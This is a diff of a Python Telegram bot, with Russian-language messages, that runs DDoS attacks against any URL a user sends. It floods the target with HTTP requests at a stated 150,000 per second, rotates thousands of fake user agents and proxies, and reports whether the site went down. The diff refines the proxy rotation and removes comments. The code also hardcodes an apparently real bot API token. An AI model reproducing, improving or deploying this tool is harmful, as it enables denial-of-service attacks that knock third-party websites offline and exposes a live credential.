@@ -9,20 +9,14 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
-# Настройки
-API_TOKEN = '7932161824:AAEhYsRourQLwHhTqnUJPCdQ-vwGUF1BA6s'  # ЗАМЕНИ НА СВОЙ ТОКЕН
+API_TOKEN = '7932161824:AAEhYsRourQLwHhTqnUJPCdQ-vwGUF1BA6s'
 
-# Инициализация бота
 bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
-# Глобальные переменные
 active_attacks = {}
 
-# ==================== ГЕНЕРАЦИЯ ЮЗЕРАГЕНТОВ ====================
 def generate_user_agents(count=2000):
-    """Генерирует реалистичные юзерагенты"""
-    
     windows_versions = ["10.0", "11.0", "6.1", "6.2", "6.3", "10.0; Win64; x64", "11.0; Win64; x64"]
     mac_versions = ["14_3", "14_2", "14_1", "14_0", "13_6", "13_5", "13_4", "13_3"]
     linux_distros = ["Linux x86_64", "X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]
@@ -45,7 +39,6 @@ def generate_user_agents(count=2000):
     
     user_agents = []
     
-    # Chrome
     for _ in range(count // 3):
         chrome_ver = random.choice(chrome_versions)
         chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
@@ -60,7 +53,6 @@ def generate_user_agents(count=2000):
             f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_str} Safari/537.36"
         )
     
-    # Firefox
     for _ in range(count // 4):
         firefox_ver = random.choice(firefox_versions)
         firefox_str = f"{firefox_ver[0]}.{firefox_ver[1]}"
@@ -70,7 +62,6 @@ def generate_user_agents(count=2000):
             f"Gecko/20100101 Firefox/{firefox_str}"
         )
     
-    # Safari
     for _ in range(count // 6):
         safari_ver = random.choice(safari_versions)
         safari_str = f"{safari_ver[0]}.{safari_ver[1]}"
@@ -80,7 +71,6 @@ def generate_user_agents(count=2000):
             f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_str} Safari/605.1.15"
         )
     
-    # Mobile
     for _ in range(count // 5):
         device, os = random.choice(mobile_devices)
         
@@ -106,9 +96,7 @@ def generate_user_agents(count=2000):
 
 USER_AGENTS = generate_user_agents(2000)
 
-# ==================== ЗАГРУЗКА ПРОКСИ ====================
 def load_proxies():
-    """Загружает прокси из файла или генерирует тестовые"""
     try:
         with open('proxies.txt', 'r', encoding='utf-8') as f:
             proxies = []
@@ -123,8 +111,7 @@ def load_proxies():
                         proxies.append(f"http://{line}")
             return proxies
     except FileNotFoundError:
-        print("⚠️ Файл proxies.txt не найден, используем тестовые прокси")
-        # Генерация тестовых прокси
+        print("Файл proxies.txt не найден, используем тестовые прокси")
         test_proxies = []
         for i in range(100):
             ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
@@ -133,12 +120,12 @@ def load_proxies():
         return test_proxies
 
 PROXY_LIST = load_proxies()
+PROXY_REUSE_COUNT = 200
 
-# ==================== МЕНЕДЖЕР АТАК ====================
 class AdvancedAttackManager:
     def __init__(self):
-        self.user_agents = USER_AGENTS * 5  # Умножаем для разнообразия
-        self.proxies = PROXY_LIST * 3 if PROXY_LIST else [None]
+        self.user_agents = USER_AGENTS * 5
+        self.proxies = PROXY_LIST * PROXY_REUSE_COUNT if PROXY_LIST else [None]
         
     def get_random_headers(self):
         return {
@@ -150,13 +137,14 @@ class AdvancedAttackManager:
             'Cache-Control': 'no-cache'
         }
     
-    def get_random_proxy(self):
-        if not self.proxies or self.proxies == [None]:
+    def get_proxy_for_request(self, request_id):
+        if not PROXY_LIST:
             return None
-        return random.choice(self.proxies)
+        
+        proxy_index = request_id % len(PROXY_LIST)
+        return PROXY_LIST[proxy_index]
     
     async def check_site_status(self, url):
-        """Проверяет статус сайта"""
         try:
             async with aiohttp.ClientSession() as session:
                 start_time = time.time()
@@ -171,21 +159,18 @@ class AdvancedAttackManager:
             return {'status': 'offline', 'error': str(e)}
 
     async def run_distributed_attack(self, target_url, duration=30, target_rps=150000):
-        """Запускает распределенную атаку"""
         success_count = 0
         fail_count = 0
         start_time = time.time()
         
-        # Статус до атаки
         initial_status = await self.check_site_status(target_url)
         
-        # Параметры для 150K RPS
         total_requests = target_rps * duration
         concurrent_workers = min(1000, target_rps // 150)
         
-        print(f"🚀 Starting attack: {target_rps} RPS, {duration} seconds")
+        print(f"Starting attack: {target_rps} RPS, {duration} seconds")
+        print(f"Using {len(PROXY_LIST)} proxies with {PROXY_REUSE_COUNT} requests per proxy")
         
-        # Создаем connector
         connector = aiohttp.TCPConnector(limit=concurrent_workers, limit_per_host=concurrent_workers)
         
         async with aiohttp.ClientSession(connector=connector) as session:
@@ -195,13 +180,13 @@ class AdvancedAttackManager:
                 async with semaphore:
                     try:
                         headers = self.get_random_headers()
-                        proxy = self.get_random_proxy()
+                        proxy = self.get_proxy_for_request(request_id)
                         
                         async with session.get(
                             target_url,
                             headers=headers,
                             proxy=proxy,
-                            timeout=aiohttp.ClientTimeout(total=5),
+                            timeout=aiohttp.ClientTimeout(total=8),
                             ssl=False
                         ) as response:
                             if response.status == 200:
@@ -210,7 +195,6 @@ class AdvancedAttackManager:
                     except Exception:
                         return False
             
-            # Запускаем атаку
             batch_size = 3000
             completed = 0
             
@@ -232,7 +216,6 @@ class AdvancedAttackManager:
                 
                 completed += current_batch
                 
-                # Прогресс
                 progress = (completed / total_requests) * 100
                 if completed % (total_requests // 10) == 0:
                     print(f"Progress: {progress:.1f}%")
@@ -242,7 +225,6 @@ class AdvancedAttackManager:
         end_time = time.time()
         attack_duration = end_time - start_time
         
-        # Статус после атаки
         final_status = await self.check_site_status(target_url)
         
         return {
@@ -256,10 +238,8 @@ class AdvancedAttackManager:
             'total_requests': success_count + fail_count
         }
 
-# Создаем менеджер атак
 attack_manager = AdvancedAttackManager()
 
-# ==================== КЛАВИАТУРЫ ====================
 def get_start_keyboard():
     return InlineKeyboardMarkup(
         inline_keyboard=[
@@ -275,7 +255,6 @@ def get_cancel_keyboard():
         ]
     )
 
-# ==================== ОБРАБОТЧИКИ ====================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     welcome_text = (
@@ -302,6 +281,7 @@ async def show_stats(callback: types.CallbackQuery):
         f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
         f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
         f"⚡ <b>Макс. RPS:</b> 150,000\n"
+        f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n"
     )
     await callback.message.edit_text(stats_text, reply_markup=get_start_keyboard())
     await callback.answer()
@@ -321,60 +301,53 @@ async def start_attack(message: types.Message):
     target_url = message.text.strip()
     user_id = message.from_user.id
     
-    # Проверяем валидность URL
     if not target_url.startswith(('http://', 'https://')):
         await message.answer("❌ <b>Неверный URL</b>\nИспользуйте формат: <code>https://example.com</code>")
         return
     
-    # Проверяем нет ли уже активной атаки
     if user_id in active_attacks:
         await message.answer("⚠️ <b>У вас уже есть активная атака ддос</b>\nДождитесь завершения сейчасчишей атаки на сайтт")
         return
     
-    # Начинаем атаку
     status_msg = await message.answer(
         f"🎯 <b>Подготовка к ддосу</b>\n\n"
         f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
         f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
         f"⏱ <b>Длительность:</b> 30-60 секунд\n"
         f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
-        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n\n"
+        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
+        f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n\n"
         f"<i>🔄 Инициализация...</i>",
         parse_mode=ParseMode.HTML,
         reply_markup=get_cancel_keyboard()
     )
     
-    # Запускаем атаку в фоне
     active_attacks[user_id] = True
     attack_task = asyncio.create_task(
         execute_attack(user_id, target_url, status_msg)
     )
 
 async def execute_attack(user_id: int, target_url: str, status_msg: types.Message):
-    """Выполняет атаку и отправляет результаты"""
     try:
-        # Обновляем статус
         await status_msg.edit_text(
             f"🎯 <b>ддос атака запущена!</b>\n\n"
             f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
             f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
-            f"⏱ <b>Длительность:</b> 30-60 секунд\n\n"
+            f"⏱ <b>Длительность:</b> 30-60 секунд\n"
+            f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n\n"
             f"<i>🚀 начинаю ддосить нахуй</i>",
             parse_mode=ParseMode.HTML,
             reply_markup=get_cancel_keyboard()
         )
         
-        # Запускаем атаку
         results = await attack_manager.run_distributed_attack(
             target_url=target_url,
             duration=45,
             target_rps=150000
         )
         
-        # Формируем отчет
         success_rate = (results['success_count'] / results['total_requests']) * 100 if results['total_requests'] > 0 else 0
         
-        # Определяем статус сайта
         site_status = "✅ Онлайн" if results['final_status']['status'] == 'online' else "❌ Лежит"
         
         if results['final_status']['status'] == 'online' and results['initial_status']['status'] == 'online':
@@ -398,7 +371,6 @@ async def execute_attack(user_id: int, target_url: str, status_msg: types.Messag
             f"📊 <b>Производительность:</b> {performance_change}\n\n"
         )
         
-        # Добавляем детали статуса
         if results['final_status']['status'] == 'online':
             report_text += f"⏱ <b>Время ответа:</b> {results['final_status'].get('response_time', 0):.2f} сек\n"
             report_text += f"🔢 <b>Статус код:</b> {results['final_status'].get('status_code', 'N/A')}"
@@ -415,18 +387,16 @@ async def execute_attack(user_id: int, target_url: str, status_msg: types.Messag
             parse_mode=ParseMode.HTML
         )
     finally:
-        # Очищаем активную атаку
         if user_id in active_attacks:
             del active_attacks[user_id]
 
-# ==================== ЗАПУСК БОТА ====================
 async def main():
     logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
     
-    # Проверяем ресурсы
-    print(f"✅ Сгенерировано юзерагентов: {len(USER_AGENTS):,}")
-    print(f"✅ Загружено прокси: {len(PROXY_LIST):,}")
-    print("🚀 Бот готов к работе!")
+    print(f"Сгенерировано юзерагентов: {len(USER_AGENTS):,}")
+    print(f"Загружено прокси: {len(PROXY_LIST):,}")
+    print(f"Запросов на прокси: {PROXY_REUSE_COUNT}")
+    print("Бот готов к работе!")
     
     await dp.start_polling(bot)
 
